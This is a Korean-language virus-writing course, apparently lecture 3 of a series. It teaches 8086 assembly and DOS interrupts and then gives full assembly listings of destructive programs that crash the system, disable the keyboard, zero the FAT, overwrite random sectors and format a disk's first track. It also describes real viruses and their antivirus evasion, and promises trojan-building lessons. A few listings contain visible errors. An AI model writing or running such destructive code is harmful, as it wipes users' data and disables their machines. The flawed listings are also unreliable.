
----------------------------------------------------------------------
본 강좌의 어떤 내용도 저자와의 협의없이 무단으로 전제/복제 하는것을
금합니다.
----------------------------------------------------------------------

세번째 강좌입니다.

어셈블리라는게 워낙 방대하다 보니 일일이 서술하기는 힘듭니다.
기본적인 원리 등에 대해 서술하겠습니다.

그리고 1차 제공 바이러스 소스로,

키트 바이러스 , 시스터보 바이러스 두 종류, 문자추락 바이러스,
에이즈 바이러스, 폭포 바이러스, 핑퐁 바이러스 입니다.

바이러스 소스에 주석이 상세히 달려있습니다!!

4,5회 강좌부터는 배치 프로그래밍을 배우며 트로이 목마를
실제 제작해 보겠습니다!!

백미죠!!

그럼 기대 하세요!







 1) 어셈블리로 구현해본 바이러스

.프로그래밍 언어를 살펴보면
고급 언어는 프로그램을 작성하기 쉽다, 실행 시간이 길다.  예) BASIC, C, PASCAL
어셈블리어는 프로그램 작성하기 어렵다, 직접적인 하드웨어의 접근이 쉽다, 속도가 빠르다
는 장점이 있다.
기계어는 프로그램 작성하기가 거의 어렵다, 일부 어셈블리 프로그램시 이용하기도 한다는
특징이 있다.

 (1) 마이크로 프로세서 8086/8088 하드웨어의 레지스터 구조
레지스터란 CPU가 컴퓨터를 작동시키는데 필요한 정보를 임시로 저장하는 곳이다.
CPU 내부에는 32 bit 크기의 여러가지  레지스터가 있다.  어셈블리언어에서는 이 레지스터를 이
름까지 지정하여 선택 사용할 수 있다. 이 여러개의 레지스터는  사용 용도에 따라 범용 레지스터
/ 특수 레지스터/ 플래그 레지스터 등으로 나뉜다.
레지스터의 용도는 16진수의  데이타를 일시적으로 저장한 후 필요한 때  불러내어 쓸 수 있으며
각종 논리/산술 연산결과를  저장하거나 연산의 결과를 판단할 때 사용한다.  또한 프로그램 수행
을 위하여 기계어 명령을 읽어 들일 주소를 지정하기도 한다.



 A. 데이타 레지스터
데이터 레지스터는 각종 데이터 처리를 대상으로  한다. 8086/8088 계열의 범용 레지스터는 4가지
가 있다. 총 16비트로 이루어져있는데,  16비트 레지스터 및 8비트 레지스터 일부를 프로그래머가
명령 중에서 자유롭게 지정을  할 수 있는 범용 레지스터이다. 범용 레지스터로서의  역활 이외에
도 아래에서 설명하는 특정한 역활도 가지고있다.
이 레지스터들은  사용자가 데이타를 조작하는데  자주 필요한 것들이다. 레지스터들의  기본적인
의미는 프로그래머가 임의로 무시할수 있다.

- AX : 어큘레이터 레지스터라고도 하며 연산 레지스터로서 하며 연산의 결과나 중간 값등을 저
        장하는데 쓰인다. AH는 AX의 상위 8비트를 AL은 AX의 하위 8비트를 가리킨다.
        연산기능이 다른 것보다 조금 많은 레지스터이다.
- BX : 베이스 레지스터라고도 하며 베이스 어드레스 지정에 쓰인다. 간접 어드레스 지정시에 어
        드레스 레지스터, 트랜슬레이터 명령에 있어서 변환 테이블, 베이스 레지스터로서 사용한
        다.
- CX : 카운터 레지스터라고도 하며 반복 실행문의 반복 횟수를 지정할때 쓰인다.
- DX : 데이터  레지스터라고도 하며 어큘레이터의 보조로 활용되거나 간접 어드레스에 의한  입
        출력 명령시 어드레스 지정에 사용된다. 곱셈, 나눗셈 작업을 할 때 사용된다.



 B. 포인터 레지스터와 인덱스 레지스터

- BP : 베이스 포인터 레지스터이다.
       기본적으로 스택 영역내 어드레스를 지시하지만 스택 세그먼트 SS  영역내에 배치한 데이
       타에 대한 베이스 어드레스의 위치 지정에 사용된다.
- SI : 소스 인덱스 레지스터이다, 오퍼랜드 소스, 소스 데이터를 어드레스 지정에 사용한다.
- DI  : 데스티네이션 인덱스 레지스터이다.  오퍼랜드의 처리 대상 또는  데스티네이션 데이타를
        나타내는 데 사용된다.
- SP : 스택포인터 레지스터라고 불린다. 메모리에서 스택의 위치를 펴시한다. 스택 맨 위의 주소
       를 담고 있다.

 C. 세그먼트 레지스터
세그먼트 레지스터는 B버스 인터페이스 유닛에 달려 있는 레지스터이다. 메모리를 효과적으로 사
용가능하게 해준다.

- CS : 코드 세그먼트 레지스터이다. 실행형 프로그램 코드가 들어있는 메모리 주소를 지정한다.
- DS : 데이타 세그먼트  레지스터이다. 프로그램 수행후 데이타가 들어있는 메모리 주소를 지정
        한다.
- SS : 스택 세그먼트 레지스터이다. 스택의 시작 주소를 담고 있다.
- ES :  확장 세그먼트 레지스터이다. 데이타  세그먼트의 확장으로 쓸수 있다.  확장 세그먼트의
        시작 주소를 담고 있다.


 D. 플래그 레지스터
플래그 레스터 상태 표.


                    상  위            │            하  위
                                      │
        15  14  13  12  11  10  ９  ８│７  ６  ５  ４  ３  ２  １  ０
      ┌─┬─┬─┬─┬─┬─┬─┬─┼─┬─┬─┬─┬─┬─┬─┬─┐
      │×│×│×│×│Ｏ│Ｄ│Ｉ│Ｔ│Ｓ│Ｚ│×│Ａ│×│Ｐ│×│Ｃ│
      └─┴─┴─┴─┴─┴─┴─┴─┼─┴─┴─┴─┴─┴─┴─┴─┘
                        오  디  ↑  트│사  제      보      패      캐
                        버  렉  ↑  랩  인  로      조      리      리
                        플  션  ↑                          티
                        로      ↑                  케
                        우      인터럽트 인에이블   리

                                      ( 세트 = 1  , 리셋 = 0 )



- TF : 추적  플래그이다. 명령어가 1개씩 실행되기에 프로그램의 에러 추적등에 사용할수  있다.
        프로세서를 프로 그램 디버거용의 싱글 스테프 모드 아래 놓는다.
- IF : 인터럽트 인에이블  플래그이다. 외부 인터럽트를 Inable 또는 Disable한다. 외부 인터럽트
       의 허락을 결정한다.
- DF : 디렉션 플래그이다. 스트링처리에서 방향을 결정하기에  자동 증가나 감소가 이루어 진다.
        스트링 명령에서의 실행방향 자동 인크리먼트 또는 디크리먼트 조작을 제어 한다.
- CF :  캐리 플래그이다. 2바이트 이상의 가감산에  이용하고 최상위비트에서 자리올림 또는 그
        자리에서의 자리올림을 표시한다.
- PF : 패리티 플래그이다. 데이터 전송이나 연산시에 짝수 패리트를 검사해 준다.
- AF : 보조 캐리 플래그이다. 4비트에서 5비트로 자리올림을 표시해 준다.
- ZF : 제로 플래그이다. 연산에서 자주 쓰인다. 연산 결과가 0이면 1이라고 표시해 준다.
- SF : 부호 플래그이다. 부호를 표시해  준다. 오퍼레이션의 결과,최상위 비트가 1일때 세트된다.
        0=정,1=부의 부호를 표시한다.
- OF : 오버플로우 플래그이다. 산술연산 결과의 오버플로우 상태를 표시한다.
- IP : 명령 포인터 레지스터이다. 현재 실행중인 명령의 위치를 가리킨다.


*간단한 사용예.

     mov  ax, bx    ☞  bx 를 ax 에 넣어라
                         (bx 값이 없어지고 ax로 가는 것이 아니라 ax 에 bx값이 복사된다고
                         생각하면 된다)

     inc  cx        ☞  cx 값을 하나 증가시켜라.
                        ( C 에서는 cx++ 와 같은 의미이며 cx 가 FFFF 일 경우 하나 증가
                         시키면 0000 값이  된다)


     add  dx, si    ☞  C 에선 dx += si 와 같은 의미이며 dx 와 si를 더한 결과를 다시 dx에
                       집어넣는 명령

     shl  bx, cl    ☞  C 에선 bx<<cl 과 같은 의미이며 bx 를 cl 값 만큼 왼
                        쪽으로 shift 시키는 것을 말한다.
                        cl 값이 16 이상이면 bx 값은 다 밀려 나가고 0이 된다
                        이때 cl 위치의 레지스터는 다른것을 사용할 수 없음.



(2) 어셈블러 범용 명령어
기본적이고 자주쓰는 어셈블러  명령어들을 모아보았다. 이 정도만 알고 있어도  어셈블리 언어로
제작된 바이러스 소스는  알아볼수 있을것이다. 좀 더 자세한것은  어셈블러 자료를 보기 바란다.
이 책에서 어셈블러를 다 설명할 수는 없기 때문이다.

MOV : 어셈블러에서 가장 많이 사용하는 명령어이다. 필요한 정보를 이동 시키는 명령어이다.

ＰＵＳＨ : 저장할 레지스터 (SAVE)

ＰＯＰ: 환원시킬 레지스터 (LOAD)


ＡＤＤ : 덧셈을 가능하게  해준다. 2개의 오퍼랜드 덧셈을 실행하고, 그 결과를 제  1 오퍼랜드에
         집어넣는다.
ＳＵＢ : 뺄셈을 가능하게  해준다. 데스티네이션 오퍼랜드에서 소스 오퍼랜드를 빼고,  그 결과를
         제 1 오퍼랜드에 넣는다.

ＭＵＬ : 곱셈을 가능하게 해준다. 첫번째 오퍼랜드는 항상 AX(16비트 연산)와 AL(8비트 연산)을
         사용한다. 곱셈 작업 연산 결과가 32비트인 경우에는 DX:AX에, 16비트인 경우에는 AX
         에 항상 저장된다.


DIV : 나눗셈을 가능하게 해준다.


CMP : 비교연산 명령어이다.  CMP는 비교 연산작업에 필수적인 명령어로서 중요한  명령어이다.
       고급 언어의 IF∼THEN 과 같은 형식이다.

INC, DEC : 증감 명령어이다. 이 명령은 순환문, 반복문 등에서 반복 횟수등을 제어한다.

JMP : 고급 프로그래밍 언어에서의 GOTO 명령과 같은 점프작업을 한다. 원거리,  근거리 점프와
       조건적, 무조건적 점프로 구분할 수 있다.


* 바이러스에 많이 나오는 명령들
PUSH AX(BX,CX,DX...) : 거의 모든 프로그램에서 나오는 명령인 레지스터 저장이다.
Int  21 : 인터럽트 21인 기능은 호출이다.
         보통의 램 상주 바이러스 자신임을 나타낼 독특한 값을 사용한다.
         예로 방랑자 변종들은  MOV AX,F060 부터 시작하는데 나중으로  갈수록 61,62 등으로
         바뀌고 램에 존재하면 AX 에 0000 이 들어온다.
MOV  BX,ES   : MCB 위치를 구하는것이다.
DEC  BX  ; 램에 상주하는 바이러스들에서 사용한다.
REPZ MOVSB  : DS:[SI] 값을 ES:[DI] 로 복사하는 것이다.
                 보통 바이러스 자신을  복사하거나 할때 사용된다..
CLI,STI  : 이명령이 없이 직접 인터럽트를 바꾸면 정지할수가  있다.
          파일 바이러스에서 많이 가로채는 AH 번호들  3D,43,4B,56,41,3C,3E 등이다.
AND     AL,DF  : 이것은 대문자로  바꾸는 것입니다. 즉, ASC 값에서 소문자일경우  대문자가
                    되는것입니다.
MOV  AX,3524  : Int 24h 는 에러처리 부분이다.
                  즉, 쓰기 방지  INT  21 등의 디스크에서는 감지시 에러가 발생하는데 이것을
                  바이러스가 가로채서 화면에 아무런 말도 나오지 않게 한다.
CALL FAR [0008]   ; 인터럽트를 호출한다.
RET 4E,4F        : 주로 비상주형 바이러스들이 많이 사용한다. 파일을 찾을때 사용된다.




*간단한 소스 와 의미 분석

        어셈블 소스                  기계어(Opcode)
   ─────────────┼─────────
      mov     ax, 1234H      │     B8 34 12
      ┬─    ┬  ┬─
      │      │  └─  operand#2  (source:값의 출처)
      │      └───  operand#1  (destination:값이 들어갈 방)
      └───────  mnemonic   (명령어에 해당되는 짧은 기호)

  <소스로 본 의미>
    mov   : operand#2를 operand#1에 넣으라는 의미
    ax    : ax라는 이름의 16bit 레지스터를 가리킴
    1234H : 실제 value

    위의 명령을 수행하면 16 bit값 1234H가 ax 로 대입된다.

  <기계어(Opcode)로 본 의미>
    B8    : 바로뒤의 두바이트를 ax에 넣으라는 의미
    34 12 : 1234H 의 하위 바이트 값이 먼저 온다는 것에 주의 !!!



명령어의 구조 .명령어의 세분 : Mnemonic, operand#1, operand#2, operand#3

  mov      ax,   1234H          ; ';' 이후로 한줄의 끝 까지는 comment
  ┬─     ▲    ─┬─
  │       │      │ 데이타의 이동은 항상 맨 앞이 들어갈 방이고 뒤는
  │       └───┘ 나오는 방이다.
  │
  └─ 니모닉(Mnemonic) : 사람이 알아보기 편하고 쓰기 편한 약어이다.
                          옮기다는 뜻을 가진 move에서 'e' 를 뗀 형태이다.

   Mnemonic 다음에는 보통 하나 또는 두개의 operand가 따라오는데 명령의 종류
   에 따라 오퍼랜드 갯수는 0 - 3 개 까지 다양하다.
   operand에는 여러가지 형태가 존재한다. Immediate value(즉치값), register
   (레지스터), memory(메모리에 있는 값) 들이 있으며 크기도 1 비트에서 10
   바이트 까지 여러 크기가 있다. operand#1의 종류와 operand#2의 종류는 여러
   가지 조합을 가질 수 있으나 몇가지 사용할 수 없는 조합이 있다.

   첫째 : operand#1은 Immediate value가 될 수 없다.
   둘째 : cbw, cwd 등의 경우같은 특수 명령을 제외하고는 양쪽의 크기는 같아
          야 한다.



*  DOS FUNCTION CALL

   입출력 등의 루틴을 하나 하나 작성하려면 굉장히 많은 노력이 든다.
이와 같이 많이 쓰이는 기본적인 루틴들을 시스템에 만들어  놓고, 시스템 이용자가 자유롭게 사
용할 수 있게 해놓았다.
이것을 사용하기 위한 방법이 시스템 호출 (SYSTEM CALL)이다.
   MS-DOS에서는 주로  인터럽트 21H (INT  21H)를 사용하고 그중에서 서브  COMMAND를
설정한다.

       사용 방법

       +--                --+
       | MOV  AH, 펑션코드 |
       | INT  21H          |
       +-                 --+

     예)  화면으로 문자열 출력

       MOV  AH, 9
       MOV  DX, OFFSET MSG
       INT  21H
       MSG  DB 'TEST MESSAGE'

     시스템 호출의 펑션코드와 기능
  +-----------------+--------------------------------+
  |  Function Code  |          Function              |
  +-----------------+--------------------------------+
  |       1h        |  키보드로부터 한 문자 입력     |
  |       2h        |  화면에 한 문자 출력           |
  |       5h        |  프린터로 한 문자 출력         |
  |       8h        |  에코(화면에) 없는 한 문자 출력|
  |       9h        |  화면으로부터 문자열 출력      |
  |       Fh        |  화일 open                     |
  |      10h        |  화일 close                     |
  |      25h        |  인터럽트 벡터 세트            |
  |      31h        |  프로세스 상주 프로그램        |
  |      35h        |  인터럽트 벡터 취득            |
  |      4Ch        |  프로그램 종료                 |
  +-----------------+--------------------------------+






 *임의의 점프 프로그램
─────────────────────────────────────
이 프로그램은 랜덤으로 점프하여 컴퓨터가 오동작을 하게 만든다.
대개의 경우 컴퓨터를 더 이상 제어할수 없게 되므로 실행에 주의를 요한다.

   1: code      segment para 'code'
   2:           assume  cs:code
   3:
   4:           org 100h
   5:
   6: main      proc far
   7: start:    mov ah,2ch              ; 시간 알아내기
   8:           int 21h
   9:
  10:           push cx                 ; CS에 pop된다
  11:           push dx                 ; IP에 pop된다
  12:
  13:           ret                     ; 임의의 리턴
  14:
  15: main      endp
  16: code      ends
  17:           end start

위 프로그램은 DOS의 호출기능을 이용하여 현재 시간을 알아내어 시간, 분, 초,
1/100초에 해당하는 값을 이용하여 실행시 마다 시시각각 변하는 값을 랜덤화에
이용한다. 그러므로 제어는 엉뚱한 곳으로 흐르게 되어 시스템은 비정상적으로
작동하게 된다.

[ 실험 결과 ]  대부분 화면에 이상한 문자를 쓰고 시스템이 죽어버렸으며
               시스템의 시계가 초기화가 된 경우가 있었다.

♠키보드 인터럽트 벡터 바꾸기 프로그램
──────────────────────────────────────
이 프로그램은 키보드 인터럽트의 벡트를 바꾸기 때문에 한번 실행되면 더
이상 키보드를 사용할수 없게 된다. 따라서 다시 컴퓨터를 작동 시키려면 재
부팅시키는 수밖에 없으므로 실행 시키기 전에 저장해야할 데이타가
있는지 꼭 살펴볼것.

   1: code      segment para 'code'
   2:           assume  cs:code
   3:
   4:           org 100h
   5:
   6:           mov ah,35h              ; 인터럽트 벡터 알아내기
   7:           mov al,6                ; 미사용 인터럽트(INT 6)
   8:           int 21h
   9:
  10:           mov ah,25h              ; 인터럽트 벡터 설정
  11:           mov al,9                ; 키보드 인터럽트(INT 9)
  12:           mov dx,bx               ; 인터럽트 처리 루틴의 오프셋
  13:           push es
  14:           pop ds                  ; 인터럽트 처리 루틴의 세그먼트
  15:           int 21h
  16:
  17:           int 20h                 ; 프로그램 종료
  18:
  19: code      ends
  20:           end crash

< 설명 >
키보드 인터럽트(Keyboard interrupt)는 하드웨어 인터럽트(Hardware interrupt)
로서 사용자가 키보드를 누르는 순간 발생한다.
인터럽트 번호는 9로서 메모리의 0000:0024h 번지에서 부터 4바이트에 걸쳐
인터럽트 실행 루틴의 시작번지가 있다.
키보드 인터럽트가 걸리게 되면 메모리의 0000:0024h 번지의 내용으로 점프하게
된다. 따라서 이 내용을 바꾸게 되면 키보드 인터럽트를 가로챌 수 있다.
이 프로그램은 도스의 기능 호출 35h로서 인터럽트 벡터를 알아낸다.
그리고 인터럽트 6번은 사용되지 않는 인터럽트이다.
이 프로그램은 인터럽트 9h의 처리 루틴 주소를 인터럽트 6h의 주소로 바꾸어
놓는 일을 한다. 따라서 키가 눌러져서 인터럽트 9h가 발생하면 결국 인터럽트
6h를 실행하게 된다. 그런데 인터럽트 6h는 사용 되지 않는 것이기 때문에 아무
일도 하지 않게 되므로 더 이상 키보드를 사용할수 없게 된다.
< Ctrl + Alt + Del > 도 사용할수 없다.

< 주의 > 이 프로그램이 실행이 되고 나면 시스템을 다시 부팅 시키는 수밖에
         없다.

< 참고 > 이 프로그램에다가 하드를 쓸데 없이 많이 읽게 하거나 특정한 트랙
         이나 랜덤한  트랙을 포맷하게 한다면 무서운 일이 버러질수 있다.
         하드의 수명이 줄고 format 명령으로 다시 포맷을 해야하는 경우가
         생기니까....


♠FAT 파괴 프로그램
──────────────────────────────────────
이 프로그램은 현재 사용 중인 드라이브의 할당 테이블을 모두 0 으로 만들어
버린다.  실행시 반드시 테스트 디스켓을 사용할것.

   1: code      segment para 'code'
   2:           assume  cs:code
   3:
   4:           org  100h
   5:
   6: start:
   7:           mov  ah,19h              ; 현재 사용중인 드라이브 알아내기
   8:           int  21h
   9:
  10:           mov  dl,al               ; 드라이브 번호 알아내기
  11:
  12:           mov  ah,3                ; 섹터 쓰기
  13:           mov  al,4                ; 기록할 섹터수
  14:           lea  bx,cs:buffer        ; 데이타 버퍼의 오프셋
  15:           mov  ch,0                ; 트랙 번호
  16:           mov  cl,2                ; 섹터 번호
  17:           mov  dh,0                ; 헤드 번호
  18:           push cs
  19:           pop  es                  ; 데이타 버퍼의 세그먼트
  20:           int  13h
  21:
  22:           int  20h
  23:
  24:      buffer    db 512 * 4 dup(?)   ; 데이타 버퍼
  25:
  26: code      ends
  27:           end  start



위 프로그램은 화일 할당 테이블을 바꾸는 프로그램으로, 그 내용은 모두 0 으로
만들어 버린다. 7,8행에서 현재 사용 중인 드라이브를 알아내고, 그 결과 사용
중인 드라이브 번호는 AL에 들어가 있게 된다. 10~20행에서는 BIOS 인터럽트 13h를
이용하여 디스크에 기록하는 일을 한다.

[ 실험 결과 ]  화일 할당 테이블이 모두 0 으로 변하였고, 화일을 실행시키려 하면
               에러가 발생한다.

♠임의의 디스크 섹터 파괴
──────────────────────────────────────
이 프로그램은 현재 사용 중인 드라이브의 디스켓을 파괴한다.


   1: code      segment para 'code'
   2:           assume  cs:code
   3:
   4:           org  100h
   5:
   6: start:    mov  ah,2ch              ; 현재 시간 구하기
   7:           int  21h
   8:
   9:           mov  ds,cx               ; 전송 버퍼의 세그먼트
  10:
  11:           mov  ax,dx               ; 디스크의 랜덤 섹터 구하기
  12:           xor  dx,dx
  13:           mov  dx,720
  14:           div  bx
  15:
  16:           mov  al,19h              ; 현재 사용중인 드라이브 알아내기
  17:           int  21h
  18:
  19:           xor  bx,bx               ; 전송할 버퍼의 오프셋
  20:           mov  cx,1                ; 기록할 섹터수
  21:           int  26h                 ; 디스크 쓰기
  22:
  23:           int  20h                 ; 프로그램 종료
  24:
  25: code      ends
  26:           end  start

< 설명 > 이 프로그램은 시스템으로부터 시간을 읽어서 그 값을 이용하여 섹터를
         파괴한다. 6~7 행에서 현재 시간을 구하고, 9~14행에서는 구한 시간을
         가지고 랜덤 섹터를 구한다. 21행에서는 DOS의 인터럽트를 이용하여
         디스크 쓰기를 하였다...

< 결과 > 이 프로그램을 실행할때 마다 사용중인 디스크의 임의의 섹터를 파괴한다.

♠디스크의 첫 트랙 포멧
──────────────────────────────────────
이 프로그램은 현재 사용 중인 드라이브의 첫 트랙을 포멧시킨다.
한번 실행 시키면 그 디스크는 도스의 FORMAT.EXE 나 PCTOOLS.EXE 로 다시 포멧
시켜야지만 사용할 수 있다.

   1: code      segment para 'code'
   2:           assume  cs:code
   3:
   4:           org  100h
   5:
   6: start:
   7:           mov  ah,19h              ; 현재 사용중인 드라이브 알아내기
   8:           int  21h
   9:
  10:
  11:           mov  dl,al               ; 드라이브 번호
  12:
  13:           mov  ah,5                ; 트랙 포멧하기
  14:           mov  al,9                ; 섹터의 갯수
  15:           lea  bx,marker           ; 어드레스 마커의 오프셋
  16:           push cs                  ; 어드레스 마커의 세그멘트
  17:           pop  es
  18:           mov  ch,0                ; 트랙 번호
  19:           mov  cl,1                ; 섹터 번호
  20:           mov  dh,0                ; 헤드 번호
  21:           int  13h
  22:
  23:           int  20h
  24:
  25:      marker    db 0                ; 트랙 번호
  26:                db 0                ; 헤드 번호
  27:                db 1                ; 섹터 번호
  28:                db 2                ; 섹터당 바이트(512)
  29:
  30: code      ends
  31:           end  start

< 설명 > 바이러스가 수행할 수 있는 작업 중에 가장 치명적이고 심각함 문제가
         되는 것이 디스크를 포멧시키는 것이다.
         위 프로그램을 보면 알수 있듯이 디스크를 포멧하는 것은 아주 간단하고
         쉽다. 7~8 행에서 현재 사용중인 드라이브를 알아내고, 트랙,섹터,헤더에
         값을 주어 디스크의 첫 트랙을 포멧시도록 되어 있다.

< 결과 > 이 프로그램이 실행되고나면 현재 사용중인 드라이브의 디스크를 파괴시킨
         다.




(3) 어셈블리 바이러스 실제 구현
실제로 어셈블리로 제작된 바이러스의 소스를 공개하겠다. 어셈블리로  제작된 바이러스의 구조와
원리 등을 파악하여 대처하기 바란다.


 A. 시스터보 바이러스
이 바이러스는 예전에 하이텔 OSC동호회에 올려졌던 SYSTURBO 바이러스의 정식 버젼(?)이다.
고정적인 코드는 다른 풀그림에서도 사용되는 mov ax,cs/mov  ds,ax, 이런 코드이기에 백신 제조
시 자칫 멀쩡한 프로그램을 오판할수 있는 기회를 많이 주었다.
감염외에는 아무일도 하지 않는다.
다크어벤져식의 램 상주 방법으로는 EMS상태에서  감염된 화일이 처음 실행시 pklite 1.03버젼과
exepack 4.0버젼으로 압축된 화일과  잘 동작이 되지 않았다. 그래서 처음  실행되는 감염된 화일
의 실행은 예루살렘의 재로딩 기법을 썼다. 소스는 다소  길어졌지만 기존 다크어벤져나 예루살렘
이 EMS에서 잘 작동되지 않던 것은 것을 고쳤다고 할 수 있다.
상주 여부는 벡터테이블중  CP/M처리 루틴이 있는 8바이트  영역에 있다. 이것중 한바이트를 이
용, 이 값이 25h이면 상주를 포기한다. 참고로  DIR-II도 이 부분을 쓰는데 이것과 위치를 틀리게
해서 충돌을 막았다.
이 프로그램의 특징은 XOR로 암호화 하는것과 앞과 뒤의 프로그램의 길이가 가변이라는 점이다.
그래서 기존 한국형 백신들이 오프셋의  어떤 바이러스문자열을 찾아 치료하는 그런 간단한 루틴
으로는 못치료하게 되었다. 물론 여기에서 소개하는 바이러스는 SYSTURBO 바이러스와 동일 루
틴이니 백신 치료는 가능하다.
실행되는 화일중 이름에 V, C, HWP는 피해서  감염한다. 백신과 스캔 그리고 COMMAND.COM,
, 아래아 한글을 피하기 위한것이다.



 B. KIT 바이러스
1991년 10월에 케텔(KETEL)의  공개자료실(GLdown)에서 발견된 파일 바이러스이며,  한국산 파
일   바이러스중에서  8번째로   발견된  바이러스이다.   공개   자료실에  7455번으로   등록된
LPARK2.COM이라는 프로그램으로  4yfkg9라는 사용자가 등록했으며, VGA용  파킹(Parking) 프
로그램이라는 설명이 붙어있었다.
이  프로그램을 실행시키면  PARK2.COM이라는  13344 byte  길이의  프로그램이 생성되는  데
PARK2.COM을 실행시키면 'Turn Off Your System!'(당신의 시스템을 끄시오!)이라는 말과  함께
여자의  상반신  누드사진이  불분명하게  출력된다.  이  바이러스를  분석해  보면  'Copyright
1991-1999.KIT VIRUS(version 2.0)'이라는 문자열이 존재한다.
감염된 프로그램을 실행시킨지 20분이 경과하면 키보드에서 <Num Lock>,<Caps Lock>, <Scroll
Lock>을 나타내는 세개의 램프가 번갈아가면서 점등하는 현상이 발생하는  데, 이 모습이 TV 외
화 프로그램인 '전격 Z  작전'에 나오는 자동차의 이름인 키트(KIT)의 앞모습과  비슷하여 이름을
붙인 것이다.
상주형, 기생형 바이러스이다. 감염되면 확장명이 COM 파일인  경우는 2384 byte 늘어나고, EXE
파일은 바이러스가 기억장소에 상주한 시간에 따라서 증가 길이가 달라져서 2384∼2479 byte까지
증가할 수 있다.
감염후 파일을 수행할 경우  20분 간격으로 30초간 키보드 우측상단의 3개의  램프를 깜박거린다.
프로그램을 실행시키기 위해서  로드하는 시간이 평소보다 오래 걸린다.  백신Ⅲ와 SCAN은 감염
되어도 길이가  증가하지 않는다. 진단하기 위해서는  VⅢ63 이상을 사용해야  하며, 치료는 VⅢ
V63 이상의 버전을 사용해야 한다.
소스는  KIT20.ASM 이란것으로 제공하니 참조하기 바란다.


 C. 에이즈(AIDS) 바이러스
이 바이러스는 하하하(Hahaha), 조롱(Taunt),  VGA2CGA 바이러스라고도 알려져 있다. 겹쳐쓰기
형 및 비상주형 바이러스이다. COM 프로그램의  처음 13KB 정도를 바이러스 프로그램으로 채우
기 때문에 완전히 복구가 불가능하다.  'Your Computer now has AIDS'라는 말을 출력하면서 시
스템을 정지시킨다.



기타 바이러스......
